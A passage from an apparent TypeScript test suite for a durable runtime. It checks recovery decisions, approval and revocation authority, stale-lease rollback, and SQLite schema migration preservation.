      queryOutcome: async () => null,
      conditionChecker: checker,
    });
    const decision = report.effects[0];
    expect(decision.decision).toBe('incident_blocked');
    expect(decision.detail ?? '').toContain('route_policy_drift');
  });
});

/* ============================================================
 * 13b. Current redaction authority is part of recovery + repair.
 * ============================================================ */
describe('Sequence 1B M1 — redaction rule drift gates recovery and repair', () => {
  let dir: string;
  beforeEach(() => {
    dir = newTmpDir('s1b-redaction-drift');
    fs.mkdirSync(dir, { recursive: true });
  });
  afterEach(() => { try { fs.rmSync(dir, { recursive: true, force: true }); } catch {} });

  async function recoverWithDrift(state: 'planned' | 'unknown') {
    const dbService = new DatabaseService(dir);
    const odb = dbService.getOgraDatabase();
    const runtime = new DurableRuntimeService(odb, () => 'ph-redaction', () => 'r1.0.0');
    const capsuleStore = new EncryptedCapsuleStore(odb,
      new StaticMasterKeyProvider(crypto.randomBytes(32)));
    const protocol = new EffectProtocolService(odb, runtime, capsuleStore);
    const recovery = new RecoveryService(odb, runtime, capsuleStore, protocol);
    const audit = new AuditService(dbService);
    const policy = new PolicyService(audit);
    const route = new RouteService(policy);
    const workspaceId = makeWorkspaceId(odb);
    const runId = makeRunId(odb, workspaceId);
    const routeDecisionId = `rd-redaction-${crypto.randomBytes(4).toString('hex')}`;
    odb.getDB().prepare(`INSERT INTO route_decisions
      (id, run_id, route, data_classification, requires_user_approval, created_at)
      VALUES (?, ?, 'local', 'Public', 0, ?)`)
      .run(routeDecisionId, runId, new Date().toISOString());
    const root = runtime.createRootFrame({ runId });
    const frame = runtime.createChildFrame({
      runId, parentFrameId: root.id, frameKind: 'plan_step',
    });
    runtime.acquireLease({ runId, holderId: 'redaction-before-crash', ttlMs: 60_000 });
    const prepared = protocol.prepare({
      runId, ownerFrameId: frame.id, effectType: 'model.generate',
      adapterKind: 'mock', adapterVersion: 'redaction-test', payload: { task: 'redaction' },
      payloadFingerprint: 'egress-redaction', capsuleFingerprint: 'capsule-redaction',
      idempotencyKey: 'idem-redaction', scopeHash: 'scope-redaction',
      routeDecisionId, policyEvaluationId: 'pe-redaction',
      policyVersionHash: policy.getPolicyVersionHash(), redactionRuleVersion: 'r1.0.0',
      supportsIdempotencyKey: true,
    });
    if (state === 'unknown') {
      protocol.casToInFlight({
        effectId: prepared.effectId, expectedRevision: 1, expectedAttemptNo: 1,
        leaseHolder: 'redaction-before-crash',
      });
      runtime.transitionEffect({
        effectId: prepared.effectId, expectedRevision: 2,
        expectedState: 'in_flight', nextState: 'unknown',
      });
    }
    odb.getDB().prepare(`UPDATE recovery_leases SET released_at = ?,
      lease_version = lease_version + 1 WHERE run_id = ?`)
      .run(new Date().toISOString(), runId);
    const { DefaultRecoveryConditionChecker } = await import(
      '../../src/core/recovery-condition-checker');
    const checker = new DefaultRecoveryConditionChecker(
      odb, policy, route, () => ({
        workspaceId, dataClassification: 'Public' as any, task: 'm1_test',
      }), () => 'r2.0.0');
    const report = await recovery.recover({
      runId, holderId: 'redaction-after-crash', adapterSupportsIdempotencyKey: true,
      conditionChecker: checker,
    });
    return { runtime, prepared, report };
  }

  it.each(['planned', 'unknown'] as const)(
    'permits %s local recovery when an unrelated live redaction rule drifts',
    async (state) => {
      const result = await recoverWithDrift(state);
      expect(result.report.effects[0]).toMatchObject({ decision: 'controlled_retry' });
      expect(result.runtime.readEffect(result.prepared.effectId).state).toBe('in_flight');
    },
  );

  it('permits asynchronous local repair creation when an unrelated live redaction rule drifts', async () => {
    const process = wireProcess(dir, crypto.randomBytes(32));
    const workspaceId = makeWorkspaceId(process.odb);
    const runId = makeRunId(process.odb, workspaceId);
    const root = process.runtime.createRootFrame({ runId });
    const frame = process.runtime.createChildFrame({
      runId, parentFrameId: root.id, frameKind: 'plan_step',
    });
    const routeDecisionId = `rd-repair-redaction-${crypto.randomBytes(4).toString('hex')}`;
    process.odb.getDB().prepare(`INSERT INTO route_decisions
      (id, run_id, route, data_classification, requires_user_approval, created_at)
      VALUES (?, ?, 'local', 'Public', 0, ?)`)
      .run(routeDecisionId, runId, new Date().toISOString());
    const prepared = process.protocol.prepare({
      runId, ownerFrameId: frame.id, effectType: 'repairable',
      adapterKind: 'mock', adapterVersion: 'redaction-test', payload: { repair: true },
      payloadFingerprint: 'egress-repair-redaction', capsuleFingerprint: 'capsule-repair-redaction',
      idempotencyKey: 'idem-repair-redaction', scopeHash: 'scope-repair-redaction',
      routeDecisionId, policyEvaluationId: 'pe-repair-redaction', policyVersionHash: 'ph_m1',
      redactionRuleVersion: 'r1.0.0',
    });
    process.odb.getDB().prepare(`UPDATE run_effects
      SET allowed_repair_actions_json = '["retry"]' WHERE id = ?`).run(prepared.effectId);
    const effect = process.runtime.readEffect(prepared.effectId);
    const audit = new AuditService(new DatabaseService(dir));
    const policy = new PolicyService(audit);
    const route = new RouteService(policy);
    const { DefaultRecoveryConditionChecker } = await import(
      '../../src/core/recovery-condition-checker');
    process.runtime.attachRepairConditionChecker(new DefaultRecoveryConditionChecker(
      process.odb, policy, route, () => ({
        workspaceId, dataClassification: 'Public' as any, task: 'm1_test',
      }), () => 'r2.0.0'));
    await expect(process.runtime.createRepairWithCurrentConditions({
      runId, targetFrameId: frame.id,
      expectedSubtreeRevision: process.runtime.readFrame(frame.id).subtreeRevision,
      authorizedEffectRevisions: { [effect.id]: effect.effectRevision },
      proposedPlan: [{ effectId: effect.id, expectedEffectRevision: effect.effectRevision, action: 'retry' }],
    })).resolves.toMatchObject({ runId, targetFrameId: frame.id });
  });
});

/* ============================================================
 * 14. Recovery approval authority and finalizer lease races.
 * Plans 02 §3.4 and 10 §4 require a fresh, effect-revision-scoped
 * approval for each recovery callback, and a live recovery lease for
 * every terminal mutation.
 * ============================================================ */
describe('Sequence 1B M1 — recovery approval authority', () => {
  let dir: string;
  beforeEach(() => {
    dir = newTmpDir('s1b-recovery-authority');
    fs.mkdirSync(dir, { recursive: true });
  });
  afterEach(() => { try { fs.rmSync(dir, { recursive: true, force: true }); } catch {} });

  async function createUnknownCoreEffect() {
    const { OgraCore } = await import('../../src/core');
    const { OgraSecretBroker } = await import('../../src/core/secret-broker');
    const core = new OgraCore({
      appDataDir: dir, secretBroker: new OgraSecretBroker(dir), isDev: true,
    });
    await core.initialize();
    const db = core.databaseService.getRawDB();
    const workspaceId = `ws-r8-${crypto.randomBytes(3).toString('hex')}`;
    const now = new Date().toISOString();
    db.prepare(`INSERT INTO workspaces
      (id, name, type, default_data_classification, created_at, updated_at, workspace_tag)
      VALUES (?, 'r8', 'personal', 'Public', ?, ?, hex(randomblob(16)))`)
      .run(workspaceId, now, now);
    const runId = `run-r8-${crypto.randomBytes(3).toString('hex')}`;
    core.databaseService.storeRun({
      id: runId, workspaceId, task: 'recovery approval authority',
      status: 'created', startedAt: now,
    });
    const routeId = `rd-r8-${crypto.randomBytes(3).toString('hex')}`;
    // Local is deliberate: the test isolates callback authority while the
    // stored route still requires a user approval.
    db.prepare(`INSERT INTO route_decisions
      (id, run_id, route, data_classification, requires_user_approval, created_at)
      VALUES (?, ?, 'local', 'Public', 1, ?)`)
      .run(routeId, runId, now);
    const scope = { action: 'retry_model_callback', routeId };
    const scopeHash = crypto.createHash('sha256').update(JSON.stringify(scope)).digest('hex');
    const payloadFingerprint = crypto.createHash('sha256').update('egress-r8').digest('hex');
    const policyVersionHash = core.policyService.getPolicyVersionHash();
    const initial = await core.runService.requestApproval({
      runId, workspaceId, approvalType: 'egress', requestedScope: scope,
      policyVersionHash, payloadFingerprint,
    });
    await core.runService.submitApprovalDecision({
      approvalId: initial.id, runId, workspaceId, decision: 'approved', decidedBy: 'test',
    });
    const root = core.durableRuntime.createRootFrame({ runId });
    const frame = core.durableRuntime.createChildFrame({
      runId, parentFrameId: root.id, frameKind: 'plan_step',
    });
    core.durableRuntime.acquireLease({ runId, holderId: 'before-crash', ttlMs: 60_000 });
    const prepared = core.effectProtocol.prepare({
      runId, ownerFrameId: frame.id, effectType: 'model.generate',
      adapterKind: 'test', adapterVersion: 'r8', payload: { task: 'retry' },
      payloadFingerprint,
      capsuleFingerprint: crypto.createHash('sha256').update('capsule-r8').digest('hex'),
      currentApprovalId: initial.id, idempotencyKey: `idem-r8-${runId}`,
      scopeHash, routeDecisionId: routeId, policyEvaluationId: `pe-${runId}`,
      policyVersionHash,
      recoveryCapabilities: {
        supportsIdempotencyKey: true, supportsOutcomeQuery: true, supportsCompensation: false,
      },
    });
    core.effectProtocol.casToInFlight({
      effectId: prepared.effectId, expectedRevision: 1, expectedAttemptNo: 1,
      leaseHolder: 'before-crash', approvalId: initial.id,
    });
    core.durableRuntime.transitionEffect({
      effectId: prepared.effectId, expectedRevision: 2,
      expectedState: 'in_flight', nextState: 'unknown',
    });
    db.prepare(`UPDATE recovery_leases SET released_at = ?, lease_version = lease_version + 1
      WHERE run_id = ?`).run(new Date().toISOString(), runId);
    return { core, db, workspaceId, runId, scope, prepared };
  }

  it('production API creates revision-bound recovery authority that recovery consumes atomically', async () => {
    const { core, db, workspaceId, runId, scope, prepared } = await createUnknownCoreEffect();
    const approval = await core.requestRecoveryApproval({
      runId, workspaceId, effectId: prepared.effectId, requestedScope: scope,
    });
    const approvalRow = db.prepare(`SELECT approval_type, decision, effect_id,
      effect_revision, payload_fingerprint, scope_hash, policy_version_hash
      FROM approvals WHERE id = ?`).get(approval.id) as any;
    expect(approvalRow).toMatchObject({
      approval_type: 'recovery_retry', decision: 'pending', effect_id: prepared.effectId,
      effect_revision: 3,
    });
    expect(approvalRow.payload_fingerprint).toBe(
      core.durableRuntime.readEffect(prepared.effectId).payloadFingerprint);
    expect(approvalRow.scope_hash).toBe(approval.scopeHash);
    expect(approvalRow.policy_version_hash).toBe(core.policyService.getPolicyVersionHash());
    const approvalEvent = db.prepare(`SELECT id FROM run_events
      WHERE run_id = ? AND event_type = 'recovery_approval_requested'`).get(runId) as any;
    expect(approvalEvent?.id).toBeTruthy();
    expect(db.prepare(`SELECT source_event_id FROM audit_edges
      WHERE from_kind = 'effect' AND from_id = ? AND relation = 'recovery_approval_requested'
        AND to_kind = 'approval' AND to_id = ?`).get(prepared.effectId, approval.id))
      .toMatchObject({ source_event_id: approvalEvent.id });

    await core.runService.submitApprovalDecision({
      approvalId: approval.id, runId, workspaceId, decision: 'approved', decidedBy: 'test',
    });
    const report = await core.recover({
      runId, holderId: 'recovery-holder', adapterSupportsIdempotencyKey: true,
      adapterSupportsOutcomeQuery: true, queryOutcome: async () => ({ applied: false }),
      recoveryApprovalId: approval.id,
    });
    expect(report.effects).toMatchObject([{
      effectId: prepared.effectId, decision: 'controlled_retry', attemptNo: 2,
    }]);
    expect(db.prepare(`SELECT approval_id, binding_kind, callback_attempt_no
      FROM effect_approval_bindings WHERE effect_id = ? AND callback_attempt_no = 2`)
      .get(prepared.effectId)).toEqual({
      approval_id: approval.id, binding_kind: 'recovery_retry', callback_attempt_no: 2,
    });
    expect(db.prepare(`SELECT approval_id, effect_id, callback_attempt_no
      FROM approval_consumptions WHERE approval_id = ?`).get(approval.id)).toEqual({
      approval_id: approval.id, effect_id: prepared.effectId, callback_attempt_no: 2,
    });
    core.shutdown();
  });

  it('revocation after production approval blocks recovery before callback intent mutation', async () => {
    const { core, db, workspaceId, runId, scope, prepared } = await createUnknownCoreEffect();
    const approval = await core.requestRecoveryApproval({
      runId, workspaceId, effectId: prepared.effectId, requestedScope: scope,
    });
    await core.runService.submitApprovalDecision({
      approvalId: approval.id, runId, workspaceId, decision: 'approved', decidedBy: 'test',
    });
    await core.runService.revokeApproval({
      approvalId: approval.id, runId, workspaceId, decidedBy: 'test', reason: 'revoked before retry',
    });
    const eventCountBefore = (db.prepare('SELECT COUNT(*) AS c FROM run_events WHERE run_id = ?')
      .get(runId) as any).c;
    const report = await core.recover({
      runId, holderId: 'recovery-holder', adapterSupportsIdempotencyKey: true,
      recoveryApprovalId: approval.id,
    });
    expect(report.effects[0]).toMatchObject({ decision: 'incident_blocked' });
    expect(report.effects[0].detail).toContain('approval_revoked');
    expect(core.durableRuntime.readEffect(prepared.effectId)).toMatchObject({
      state: 'unknown', effectRevision: 3,
    });
    expect(db.prepare('SELECT COUNT(*) AS c FROM effect_approval_bindings WHERE effect_id = ?')
      .get(prepared.effectId)).toMatchObject({ c: 1 });
    expect(db.prepare('SELECT COUNT(*) AS c FROM approval_consumptions WHERE approval_id = ?')
      .get(approval.id)).toMatchObject({ c: 0 });
    // recover() records its lease acquisition, but a rejected callback must
    // not append a callback-intent event.
    expect((db.prepare(`SELECT COUNT(*) AS c FROM run_events WHERE run_id = ?
      AND event_type = 'effect_callback_intent'`).get(runId) as any).c).toBe(1);
    expect((db.prepare('SELECT COUNT(*) AS c FROM run_events WHERE run_id = ?')
      .get(runId) as any).c).toBeGreaterThan(eventCountBefore);
    core.shutdown();
  });

  it('rolls back approval revocation when its L1 event cannot append', async () => {
    const { core, db, workspaceId, runId, scope } = await createUnknownCoreEffect();
    const approval = await core.requestRecoveryApproval({
      runId, workspaceId,
      effectId: (db.prepare('SELECT id FROM run_effects WHERE run_id = ?').get(runId) as any).id,
      requestedScope: scope,
    });
    await core.runService.submitApprovalDecision({
      approvalId: approval.id, runId, workspaceId, decision: 'approved', decidedBy: 'test',
    });
    const eventsBefore = (db.prepare('SELECT COUNT(*) AS c FROM run_events WHERE run_id = ?')
      .get(runId) as any).c;
    const dbService = core.databaseService;
    const originalAppend = dbService.appendRunEventInTransaction.bind(dbService);
    dbService.appendRunEventInTransaction = () => {
      throw new Error('simulated audit append failure');
    };
    await expect(core.runService.revokeApproval({
      approvalId: approval.id, runId, workspaceId, decidedBy: 'test', reason: 'rollback',
    })).rejects.toThrow('simulated audit append failure');
    dbService.appendRunEventInTransaction = originalAppend;
    expect(db.prepare('SELECT decision, revision, decided_at FROM approvals WHERE id = ?')
      .get(approval.id)).toMatchObject({ decision: 'approved', revision: 1, decided_at: expect.any(String) });
    expect((db.prepare('SELECT COUNT(*) AS c FROM run_events WHERE run_id = ?')
      .get(runId) as any).c).toBe(eventsBefore);
    core.shutdown();
  });
});

describe('Sequence 1B M1 — stale lease finalizers roll back', () => {
  let dir: string;
  beforeEach(() => { dir = newTmpDir('s1b-stale-finalizer'); fs.mkdirSync(dir, { recursive: true }); });
  afterEach(() => { try { fs.rmSync(dir, { recursive: true, force: true }); } catch {} });

  function invalidateLeaseAtFinalizer(recovery: RecoveryService, odb: OgraDatabase, runId: string): void {
    const original = (recovery as any).assertActiveRecoveryLease.bind(recovery);
    let invalidated = false;
    (recovery as any).assertActiveRecoveryLease = (...args: any[]) => {
      if (!invalidated) {
        invalidated = true;
        odb.getDB().prepare(`UPDATE recovery_leases SET released_at = ?,
          lease_version = lease_version + 1 WHERE run_id = ?`)
          .run(new Date().toISOString(), runId);
      }
      return original(...args);
    };
  }

  it('stale lease cannot finalize a received effect and rolls back the ingress event/finding', async () => {
    const process = wireProcess(dir, crypto.randomBytes(32));
    const workspaceId = makeWorkspaceId(process.odb);
    const runId = makeRunId(process.odb, workspaceId);
    const root = process.runtime.createRootFrame({ runId });
    const frame = process.runtime.createChildFrame({ runId, parentFrameId: root.id, frameKind: 'plan_step' });
    process.runtime.acquireLease({ runId, holderId: 'first', ttlMs: 60_000 });
    const prepared = process.protocol.prepare({
      runId, ownerFrameId: frame.id, effectType: 'test', adapterKind: 'mock', adapterVersion: 'r8',
      payload: { value: 1 }, payloadFingerprint: 'fp-received', capsuleFingerprint: 'cap-received',
      idempotencyKey: 'idem-received', scopeHash: 'scope-received', routeDecisionId: 'rd',
      policyEvaluationId: 'pe', policyVersionHash: 'ph',
    });
    process.protocol.casToInFlight({
      effectId: prepared.effectId, expectedRevision: 1, expectedAttemptNo: 1, leaseHolder: 'first',
    });
    const receipt = process.protocol.recordReceipt({
      effectId: prepared.effectId, attemptNo: 1, requestId: 'req', requestHash: 'req-hash',
      result: { ok: true }, applicationStatus: 'applied', providerStatus: 'ok',
    });
    process.odb.getDB().prepare(`UPDATE recovery_leases SET released_at = ?,
      lease_version = lease_version + 1 WHERE run_id = ?`).run(new Date().toISOString(), runId);
    invalidateLeaseAtFinalizer(process.recovery, process.odb, runId);
    await expect(process.recovery.recover({ runId, holderId: 'second' }))
      .rejects.toMatchObject({ code: 'LEASE_NOT_HELD' });
    expect(process.runtime.readEffect(prepared.effectId)).toMatchObject({ state: 'received', effectRevision: 3 });
    expect(process.odb.getDB().prepare('SELECT COUNT(*) AS c FROM ingress_findings WHERE effect_id = ?')
      .get(prepared.effectId)).toMatchObject({ c: 0 });
    expect(process.odb.getDB().prepare(`SELECT COUNT(*) AS c FROM run_events
      WHERE run_id = ? AND event_type = 'effect_recovery_committed'`).get(runId))
      .toMatchObject({ c: 0 });
    expect(process.odb.getDB().prepare('SELECT id FROM effect_receipts WHERE id = ?').get(receipt.receiptId))
      .toBeTruthy();
  });

  it('stale lease cannot write outcome-query receipt/finding and rolls back phase one', async () => {
    const process = wireProcess(dir, crypto.randomBytes(32));
    const workspaceId = makeWorkspaceId(process.odb);
    const runId = makeRunId(process.odb, workspaceId);
    const root = process.runtime.createRootFrame({ runId });
    const frame = process.runtime.createChildFrame({ runId, parentFrameId: root.id, frameKind: 'plan_step' });
    process.runtime.acquireLease({ runId, holderId: 'first', ttlMs: 60_000 });
    const prepared = process.protocol.prepare({
      runId, ownerFrameId: frame.id, effectType: 'test', adapterKind: 'mock', adapterVersion: 'r8',
      payload: { value: 2 }, payloadFingerprint: 'fp-outcome', capsuleFingerprint: 'cap-outcome',
      idempotencyKey: 'idem-outcome', scopeHash: 'scope-outcome', routeDecisionId: 'rd',
      policyEvaluationId: 'pe', policyVersionHash: 'ph',
      recoveryCapabilities: {
        supportsIdempotencyKey: false, supportsOutcomeQuery: true, supportsCompensation: false,
      },
    });
    process.protocol.casToInFlight({
      effectId: prepared.effectId, expectedRevision: 1, expectedAttemptNo: 1, leaseHolder: 'first',
    });
    process.runtime.transitionEffect({
      effectId: prepared.effectId, expectedRevision: 2, expectedState: 'in_flight', nextState: 'unknown',
    });
    process.odb.getDB().prepare(`UPDATE recovery_leases SET released_at = ?,
      lease_version = lease_version + 1 WHERE run_id = ?`).run(new Date().toISOString(), runId);
    invalidateLeaseAtFinalizer(process.recovery, process.odb, runId);
    const report = await process.recovery.recover({
      runId, holderId: 'second', adapterSupportsOutcomeQuery: true,
      queryOutcome: async () => ({ applied: true, payload: { recovered: true } }),
    });
    expect(report.effects[0].decision).toBe('noop_already_terminal');
    expect(process.runtime.readEffect(prepared.effectId)).toMatchObject({ state: 'unknown', effectRevision: 3 });
    expect(process.odb.getDB().prepare('SELECT COUNT(*) AS c FROM effect_receipts WHERE effect_id = ?')
      .get(prepared.effectId)).toMatchObject({ c: 0 });
    expect(process.odb.getDB().prepare('SELECT COUNT(*) AS c FROM ingress_findings WHERE effect_id = ?')
      .get(prepared.effectId)).toMatchObject({ c: 0 });
    expect(process.odb.getDB().prepare(`SELECT COUNT(*) AS c FROM run_events
      WHERE run_id = ? AND event_type IN ('effect_received', 'effect_recovery_committed')`).get(runId))
      .toMatchObject({ c: 0 });
  });
});

describe('Sequence 1B M1 — normal terminal commit authority', () => {
  let dir: string;
  beforeEach(() => { dir = newTmpDir('s1b-normal-terminal'); fs.mkdirSync(dir, { recursive: true }); });
  afterEach(() => { try { fs.rmSync(dir, { recursive: true, force: true }); } catch {} });

  it('requires the captured active lease and binds terminal_event_id to effect_committed', () => {
    const process = wireProcess(dir, crypto.randomBytes(32));
    const workspaceId = makeWorkspaceId(process.odb);
    const runId = makeRunId(process.odb, workspaceId);
    const root = process.runtime.createRootFrame({ runId });
    const frame = process.runtime.createChildFrame({ runId, parentFrameId: root.id, frameKind: 'plan_step' });
    const firstLease = process.runtime.acquireLease({ runId, holderId: 'first', ttlMs: 60_000 });
    const prepared = process.protocol.prepare({
      runId, ownerFrameId: frame.id, effectType: 'test', adapterKind: 'mock', adapterVersion: 'terminal-v1',
      payload: { terminal: true }, payloadFingerprint: 'egress-terminal', capsuleFingerprint: 'capsule-terminal',
      idempotencyKey: 'idem-terminal', scopeHash: 'scope-terminal', routeDecisionId: 'rd',
      policyEvaluationId: 'pe', policyVersionHash: 'ph',
    });
    const intent = process.protocol.casToInFlight({
      effectId: prepared.effectId, expectedRevision: 1, expectedAttemptNo: 1, leaseHolder: 'first',
      expectedLeaseVersion: firstLease.leaseVersion,
    });
    const receipt = process.protocol.recordReceipt({
      effectId: prepared.effectId, attemptNo: 1, requestId: 'req-terminal', requestHash: 'req-terminal',
      result: { accepted: true }, applicationStatus: 'applied', providerStatus: 'ok',
    });
    process.runtime.releaseLease({ runId, holderId: 'first', expectedLeaseVersion: intent.leaseVersion });
    expect(() => process.protocol.commitToTerminal({
      effectId: prepared.effectId, expectedRevision: 3, expectedAttemptNo: 1, receiptId: receipt.receiptId,
      leaseHolder: 'first', expectedLeaseVersion: intent.leaseVersion,
    })).toThrow(/LEASE_NOT_HELD/);
    expect(process.runtime.readEffect(prepared.effectId)).toMatchObject({ state: 'received', terminalEventId: null });

    const secondLease = process.runtime.acquireLease({ runId, holderId: 'second', ttlMs: 60_000 });
    process.protocol.commitToTerminal({
      effectId: prepared.effectId, expectedRevision: 3, expectedAttemptNo: 1, receiptId: receipt.receiptId,
      leaseHolder: 'second', expectedLeaseVersion: secondLease.leaseVersion,
    });
    const committed = process.runtime.readEffect(prepared.effectId);
    const event = process.odb.getDB().prepare(`SELECT id FROM run_events
      WHERE run_id = ? AND event_type = 'effect_committed' ORDER BY sequence DESC LIMIT 1`).get(runId) as any;
    expect(committed).toMatchObject({ state: 'committed', terminalEventId: event.id });
  });
});

describe('Sequence 1B M1 — callback-intent lease ABA guard', () => {
  let dir: string;
  beforeEach(() => { dir = newTmpDir('s1b-lease-aba'); fs.mkdirSync(dir, { recursive: true }); });
  afterEach(() => { try { fs.rmSync(dir, { recursive: true, force: true }); } catch {} });

  it('rejects planned callback intent when the same holder releases and reacquires after recover captured its lease version', async () => {
    const process = wireProcess(dir, crypto.randomBytes(32));
    const workspaceId = makeWorkspaceId(process.odb);
    const runId = makeRunId(process.odb, workspaceId);
    const root = process.runtime.createRootFrame({ runId });
    const frame = process.runtime.createChildFrame({
      runId, parentFrameId: root.id, frameKind: 'plan_step',
    });
    const initialLease = process.runtime.acquireLease({
      runId, holderId: 'same-holder', ttlMs: 60_000,
    });
    const prepared = process.protocol.prepare({
      runId, ownerFrameId: frame.id, effectType: 'test',
      adapterKind: 'mock', adapterVersion: 'aba', payload: { value: 'aba' },
      payloadFingerprint: 'egress-aba', capsuleFingerprint: 'capsule-aba',
      idempotencyKey: 'idem-aba', scopeHash: 'scope-aba', routeDecisionId: 'rd',
      policyEvaluationId: 'pe', policyVersionHash: 'ph',
    });
    let swapped = false;
    const report = await process.recovery.recover({
      runId, holderId: 'same-holder', adapterSupportsIdempotencyKey: true,
      conditionChecker: {
        check: async () => {
          if (!swapped) {
            swapped = true;
            process.runtime.releaseLease({
              runId, holderId: 'same-holder',
              expectedLeaseVersion: initialLease.leaseVersion,
            });
            process.runtime.acquireLease({
              runId, holderId: 'same-holder', ttlMs: 60_000,
            });
          }
          return { ok: true };
        },
      },
    });
    expect(swapped).toBe(true);
    expect(report.effects[0]).toMatchObject({ decision: 'incident_blocked' });
    expect(process.runtime.readEffect(prepared.effectId)).toMatchObject({
      state: 'planned', effectRevision: 1,
    });
    expect(process.odb.getDB().prepare(`SELECT COUNT(*) AS c FROM run_events
      WHERE run_id = ? AND event_type = 'effect_callback_intent'`).get(runId))
      .toMatchObject({ c: 0 });
  });
});

describe('Sequence 1B M1 — v23/v24 approval migration preservation', () => {
  let dir: string;
  beforeEach(() => { dir = newTmpDir('s1b-v24-migration'); fs.mkdirSync(dir, { recursive: true }); });
  afterEach(() => { try { fs.rmSync(dir, { recursive: true, force: true }); } catch {} });

  it('fresh schema includes v25 repair authority and v26 effect redaction binding', () => {
    const fresh = new OgraDatabase(dir);
    fresh.runMigrations();
    const db = fresh.getDB();
    expect(db.prepare(`SELECT COUNT(*) AS c FROM _migrations
      WHERE version IN (25, 26)`).get()).toMatchObject({ c: 2 });
    expect(db.prepare(`SELECT 1 FROM sqlite_master
      WHERE type = 'table' AND name = 'repair_cross_frame_authorizations'`).get())
      .toBeDefined();
    expect(db.prepare(`SELECT name FROM pragma_table_info('run_effects')
      WHERE name = 'redaction_rule_version'`).get())
      .toEqual({ name: 'redaction_rule_version' });
    fresh.close();
  });

  it('upgrades a v25 run_effects projection by adding the v26 binding without rewriting rows', async () => {
    const Database = (await import('better-sqlite3')).default;
    const dbPath = path.join(dir, 'ogra.db');
    const raw = new Database(dbPath);
    raw.exec(`
      CREATE TABLE _migrations (version INTEGER PRIMARY KEY, name TEXT NOT NULL,
        applied_at TEXT NOT NULL DEFAULT (datetime('now')));
      INSERT INTO _migrations (version, name) VALUES (25, 'm1-repair-cross-frame-authority');
      CREATE TABLE run_effects (id TEXT PRIMARY KEY, payload_fingerprint TEXT NOT NULL);
      INSERT INTO run_effects (id, payload_fingerprint) VALUES ('effect-v25', 'preserve-v25');
    `);
    raw.close();
    const upgraded = new OgraDatabase(dir);
    upgraded.runMigrations();
    expect(upgraded.getDB().prepare(`SELECT id, payload_fingerprint,
      redaction_rule_version FROM run_effects WHERE id = 'effect-v25'`).get())
      .toEqual({ id: 'effect-v25', payload_fingerprint: 'preserve-v25', redaction_rule_version: null });
    expect(upgraded.getDB().prepare('SELECT name FROM _migrations WHERE version = 26').get())
      .toEqual({ name: 'm1-effect-redaction-rule-binding' });
    upgraded.close();
  });

  it('upgrades representative v22 approvals without losing fields or their workspace foreign key', async () => {
    const Database = (await import('better-sqlite3')).default;
    const dbPath = path.join(dir, 'ogra.db');
    const raw = new Database(dbPath);
    raw.pragma('foreign_keys = ON');
    raw.exec(`
      CREATE TABLE _migrations (
        version INTEGER PRIMARY KEY, name TEXT NOT NULL,
        applied_at TEXT NOT NULL DEFAULT (datetime('now'))
      );
      INSERT INTO _migrations (version, name) VALUES
        (22, 'm1-approval-consumption-cas');
      CREATE TABLE workspaces (id TEXT PRIMARY KEY);
      INSERT INTO workspaces (id) VALUES ('ws-v22');
      CREATE TABLE approvals (
        id TEXT PRIMARY KEY, run_id TEXT, approval_type TEXT NOT NULL,
        requested_scope_json TEXT,
        decision TEXT NOT NULL DEFAULT 'pending'
          CHECK(decision IN ('pending','approved','denied','expired')),
        decided_by TEXT, reason TEXT, expires_at TEXT,
        created_at TEXT NOT NULL, decided_at TEXT,
        workspace_id TEXT REFERENCES workspaces(id) ON DELETE CASCADE,
        scope_hash TEXT, policy_version_hash TEXT, payload_fingerprint TEXT,
        revision INTEGER NOT NULL DEFAULT 1, sanitized_preview TEXT,
        redaction_rule_version TEXT, use_limit INTEGER NOT NULL DEFAULT 1,
        uses_consumed INTEGER NOT NULL DEFAULT 0
      );
      INSERT INTO approvals (
        id, run_id, approval_type, requested_scope_json, decision,
        decided_by, reason, expires_at, created_at, decided_at, workspace_id,
        scope_hash, policy_version_hash, payload_fingerprint, revision,
        sanitized_preview, redaction_rule_version, use_limit, uses_consumed
      ) VALUES (
        'approval-v22', 'run-v22', 'egress', '{"target":"cloud"}', 'approved',
        'user-v22', 'preserve me', '2030-01-01T00:00:00.000Z',
        '2026-01-01T00:00:00.000Z', '2026-01-01T01:00:00.000Z', 'ws-v22',
        'scope-v22', 'policy-v22', 'payload-v22', 7, 'preview-v22', 'redact-v22', 3, 1
      );
    `);
    raw.close();

    const upgraded = new DatabaseService(dir);
    const db = upgraded.getRawDB();
    expect(db.prepare(`SELECT decision, workspace_id, scope_hash,
      policy_version_hash, payload_fingerprint, revision, sanitized_preview,
      redaction_rule_version, use_limit, uses_consumed, effect_id, effect_revision
      FROM approvals WHERE id = 'approval-v22'`).get()).toEqual({
      decision: 'approved', workspace_id: 'ws-v22', scope_hash: 'scope-v22',
      policy_version_hash: 'policy-v22', payload_fingerprint: 'payload-v22',
      revision: 7, sanitized_preview: 'preview-v22', redaction_rule_version: 'redact-v22',
      use_limit: 3, uses_consumed: 1, effect_id: null, effect_revision: null,
    });
    expect(db.prepare(`SELECT COUNT(*) AS c FROM _migrations
      WHERE version IN (23, 24)`).get()).toMatchObject({ c: 2 });
    expect(db.prepare(`PRAGMA foreign_key_list(approvals)`).all())
      .toEqual(expect.arrayContaining([
        expect.objectContaining({ table: 'workspaces', from: 'workspace_id' }),
      ]));
    expect(db.prepare('PRAGMA foreign_key_check').all()).toEqual([]);
    upgraded.close();
  });

  it('refuses a damaged v22 snapshot instead of fabricating an empty workspace parent', async () => {
    const Database = (await import('better-sqlite3')).default;
    const dbPath = path.join(dir, 'ogra.db');
    const raw = new Database(dbPath);
    raw.exec(`
      CREATE TABLE _migrations (version INTEGER PRIMARY KEY, name TEXT NOT NULL,
        applied_at TEXT NOT NULL DEFAULT (datetime('now')));
      INSERT INTO _migrations (version, name) VALUES (22, 'm1-approval-consumption-cas');
      CREATE TABLE approvals (
        id TEXT PRIMARY KEY, run_id TEXT, approval_type TEXT NOT NULL,
        requested_scope_json TEXT, decision TEXT NOT NULL DEFAULT 'pending',
        created_at TEXT, workspace_id TEXT
      );
      INSERT INTO approvals (id, run_id, approval_type, requested_scope_json,
        decision, created_at, workspace_id)
        VALUES ('orphan-v22', 'run-v22', 'egress', '{}', 'approved',
          '2026-01-01T00:00:00.000Z', 'missing-workspace');
    `);
    raw.close();

    const legacy = new OgraDatabase(dir);
    expect(() => legacy.runMigrations()).toThrow(/requires the existing workspaces parent table/);
    legacy.close();
    const inspected = new Database(dbPath);
    expect(inspected.prepare(`SELECT 1 FROM sqlite_master
      WHERE type = 'table' AND name = 'workspaces'`).get()).toBeUndefined();
    expect(inspected.prepare(`SELECT decision FROM approvals
